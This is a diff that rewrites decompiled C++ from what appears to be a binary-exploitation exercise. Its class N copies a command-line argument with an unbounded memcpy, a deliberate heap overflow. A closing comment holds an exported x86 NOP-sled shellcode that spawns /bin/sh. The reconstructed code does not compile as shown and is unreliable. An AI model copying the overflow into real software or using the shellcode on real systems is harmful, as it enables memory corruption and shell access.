@@ -1,60 +1,51 @@
+#include <iostream>
 
-void  N::N(N *this,int param_1)
+class N
+{
+  public:
+    N(N *,int);
+};
 
+N::N(N *this,int param_1)
 {
   *(undefined ***)this = &PTR_operator+_08048848;
   *(int *)(this + 104) = param_1;
   return;
 }
 
-int __thiscall N::operator+(N *this,N *param_1)
-
+int     N::operator+(N *obj)
 {
-  return *(int *)(param_1 + 104) + *(int *)(this + 104);
+  return *(int *)(obj + 104) + *(int *)(this + 104);
 }
 
-
-
-/* N::TEMPNAMEPLACEHOLDERVALUE(N&) */
-
-int __thiscall N::operator-(N *this,N *param_1)
-
+int     N::operator-(N *obj)
 {
-  return *(int *)(this + 104) - *(int *)(param_1 + 104);
+  return *(int *)(this + 104) - *(int *)(obj + 104);
 }
 
-
-
-/* N::setAnnotation(char*) */
-
-void __thiscall N::setAnnotation(N *this,char *str)
-
+void    N::setAnnotation(N *this, char *str)
 {
-  size_t str_length;
-  
-  str_length = strlen(str);
-  memcpy(this + 4,str,str_length);
+  memcpy(this + 4, str, strlen(str));
   return;
 }
 
-
-
-
-
 int   main(int argc, char *argv)
-
 {
-    N *this;
-    undefined4 *this_00;
+    N *obj1;
+    N *obj2;
 
     if (argc < 2) {
       exit(1);
     }
-    this = (N *)new(108);
+    // obj1 = (N *)new(108);
+    obj1 = new N();
     N::N(5);
-    this_00 = (undefined4 *)new(108);
+    obj2 = new N();
     N::N(6);
-    N::setAnnotation(this,*(char **)(param_2 + 4));
-    (**(code **)*this_00)(this_00,this);
+    obj2->setAnnotation(obj1, argv[1]);
+    
     return (0);
 }
+
+
+// export SHELLCODE=$(python -c 'print "\x90"*400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
